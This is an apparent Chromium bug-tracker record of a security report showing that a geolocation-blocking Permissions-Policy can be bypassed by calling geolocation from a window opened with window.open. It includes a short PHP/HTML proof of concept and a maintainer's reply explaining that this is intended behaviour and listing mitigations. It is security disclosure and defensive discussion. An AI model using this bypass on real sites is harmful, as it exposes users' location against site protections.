@@ -1,0 +1,112 @@
+Issue ID: 478086882
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<ol>
+<li>Please run the following test code on the server and allow geolocation on the server.</li>
+<li>After accessing the code below, geolocation requests made via navigator are normally denied.</li>
+<li>However, it is possible to invoke geolocation from a child window and successfully use the feature on a page protected by a Permission Policy.
+The reproduction code and a proof-of-concept video are attached.</li>
+</ol>
+<h1>Problem Description</h1>
+<p>Hello Chrome Security Team,
+Permission Policy (PP) headers intended to block geolocation and similar APIs can be bypassed by creating a child window.</p>
+<h3>Attack Scenario</h3>
+<p>Web developer can uses a Permission Policy header to disable APIs such as <code>geolocation</code> in order to prevent their misuse (e.g., after an XSS vulnerability is exploited).</p>
+<p>With the Permission Policy header applied, calling <code>navigator.geolocation.getCurrentPosition(...)</code> directly on the protected page is correctly blocked, as expected.</p>
+<p>However, by using <code>window.open</code> to create a child window and invoking <code>navigator.geolocation</code> from the child window, it is possible to bypass the Permission Policy and successfully access geolocation.</p>
+<h3>Proof of Concept</h3>
+<p>Below is the proof-of-concept code.</p>
+<pre><code>&lt;?php
+header(&quot;Permissions-Policy: geolocation=()&quot;);
+?&gt;
+&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;button id=&quot;open&quot;&gt;Open child&lt;/button&gt;
+&lt;button id=&quot;geo&quot;&gt;geolocation&lt;/button&gt;
+
+&lt;script&gt;
+  //allowed
+let w;
+document.getElementById(&#39;open&#39;).onclick = () =&gt; {
+  w = window.open(&#39;abcd404.html&#39;, &#39;child&#39;, &#39;width=400,height=300&#39;);
+};
+&lt;/script&gt;
+
+&lt;script&gt;
+ //allowed
+document.getElementById(&#39;geo&#39;).onclick = () =&gt; {
+  w.navigator.geolocation.getCurrentPosition(p=&gt;{alert(p.coords.latitude),e=&gt;{alert(e)}})
+};
+
+&lt;/script&gt;
+&lt;script&gt;
+  //block
+  navigator.geolocation.getCurrentPosition(
+      p =&gt; {
+        alert(p.coords.latitude);
+      },
+      e =&gt; {
+        alert(e.message);
+      }
+  );
+&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Thank you for your time and consideration:)</p>
+<h1>Summary</h1>
+<p>Permission Policy can be bypassed via child windows</p>
+<h1>Custom Questions</h1>
+<h4>Reporter credit:</h4>
+<p>Mingi jung - WEB SEC</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Not sure <br>
+Regression: N/A \</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: mi...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: mi...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: mi...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ke...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ke...@chromium.org
+public_non_google
+
+Author: ke...@chromium.org
+<p>Thank you for the report.</p>
+<p>You are correct about the behaviour you are describing, and I can see how it would be useful in some attack situations, but unfortunately this is not something we would likely be able to change.</p>
+<p>Permissions policies apply to a document and its descendant iframes, and are not intended to persist across navigations.</p>
+<p>A site attempting to mitigate XSS risk would have to adopt more comprehensive protections to prevent this sort of thing, such as:</p>
+<ul>
+<li>putting a similar permission policy on other pages in the same site, or</li>
+<li>using CSP <code>sandbox</code> so that no existing permissions will be available, or</li>
+<li>using Cross-Origin Opener Policy to prevent the window handle for the new page from being usable in the compromised page.</li>
+</ul>
+
+Author: ke...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ke...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
